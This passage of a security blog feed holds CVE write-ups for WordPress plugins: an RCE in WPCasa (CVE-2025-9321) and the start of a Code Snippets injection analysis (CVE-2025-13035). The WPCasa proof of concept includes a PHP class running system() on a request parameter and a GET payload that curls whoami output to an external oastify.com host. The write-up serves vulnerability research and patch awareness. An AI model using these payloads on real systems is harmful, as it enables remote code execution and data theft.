1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers this action hook:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;parse_request&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;api_requests&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;parse_request&lt;/code&gt;: This hook fires very early, right after WordPress parses the URL and populates &lt;code&gt;$wp&lt;/code&gt;. It is responsible for processing query variables, meaning the &lt;code&gt;api_requests&lt;/code&gt; callback executes immediately when processing the request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Attacker&amp;ensp;sends&amp;ensp;request&amp;ensp;/?wpsight-api=payload&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;parse_request&amp;ensp;hook&amp;ensp;triggers&amp;ensp;api_requests()&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Read&amp;ensp;user&amp;ensp;input&amp;ensp;$_GET[&#39;wpsight-api&#39;]&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;$api&amp;ensp;=&amp;ensp;strtolower(esc_attr(...))&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E{&#34;class_exists($api)?&#34;}&#xD;&#xA;E&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;F[&#34;Instantiate&amp;ensp;arbitrary&amp;ensp;class&amp;ensp;new&amp;ensp;$api()&amp;ensp;â†’&amp;ensp;constructor&amp;ensp;executes&#34;]&#xD;&#xA;E&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;G[&#34;Skip&amp;ensp;class&amp;ensp;creation&#34;]&#xD;&#xA;&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;H[&#34;Trigger&amp;ensp;dynamic&amp;ensp;hook&amp;ensp;do_action(&#39;wpsight_api_&#39;&amp;ensp;.&amp;ensp;$api)&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H&#xD;&#xA;&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I{&#34;Hook&amp;ensp;handler&amp;ensp;exists?&#34;}&#xD;&#xA;I&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;J[&#34;Callback&amp;ensp;executed&amp;ensp;â†’&amp;ensp;attacker-controlled&amp;ensp;code&#34;]&#xD;&#xA;I&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;K[&#34;No&amp;ensp;action,&amp;ensp;but&amp;ensp;die(&#39;1&#39;)&amp;ensp;still&amp;ensp;called&#34;]&#xD;&#xA;&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;L[&#34;RCE&amp;ensp;achieved&#34;]&#xD;&#xA;K&amp;ensp;--&gt;&amp;ensp;L&#xD;&#xA;&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;Z[&#34;End&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create an evil class in wp-config.php for testing:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send a request with payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/?wpsight-api=evil&amp;amp;cmd=curl+http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#34; title=&#34;Output&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Output&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1138&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Output&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability results from unsafe handling of the &lt;code&gt;wpsight-api&lt;/code&gt; parameter, allowing arbitrary class instantiation and hook execution, leading to RCE. The patch adds strict input validation and endpoint restrictions to prevent exploitation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;URLâ€‘supplied data must be restricted using allowâ€‘lists.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic hooks and class instantiation must not rely on user input.&lt;/li&gt;&#xA;&lt;li&gt;Insufficient input validation can lead to critical RCE vulnerabilities.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wpcasa/vulnerability/wordpress-wpcasa-plugin-1-4-1-unauthenticated-code-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin &amp;lt;= 1.4.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13035 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-27-cve-2025-13035/</link>
      <pubDate>Thu, 27 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-27-cve-2025-13035/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress Code Snippets plugin contains a PHP Code Injection vulnerability in all versions up to and including 3.9.1. The root cause is that the plugin uses &lt;code&gt;extract()&lt;/code&gt; on attacker-controlled shortcode attributes inside the &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt; method, which can be used to overwrite the &lt;code&gt;$filepath&lt;/code&gt; variable and then pass it into &lt;code&gt;require_once&lt;/code&gt;. This allows an authenticated attacker with Contributor privileges or higher to execute arbitrary PHP code on the server via the &lt;code&gt;[code_snippet]&lt;/code&gt; shortcode by leveraging PHP filter chains if they can trick an administrator into enabling the &amp;ldquo;Enable file-based execution&amp;rdquo; option and creating at least one active Content snippet.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13035&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13035&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.9.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/code-snippets/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Code Snippets&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.1&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.2&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.9.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;private&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;evaluate_shortcode_from_flat_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&amp;ensp;&lt;span 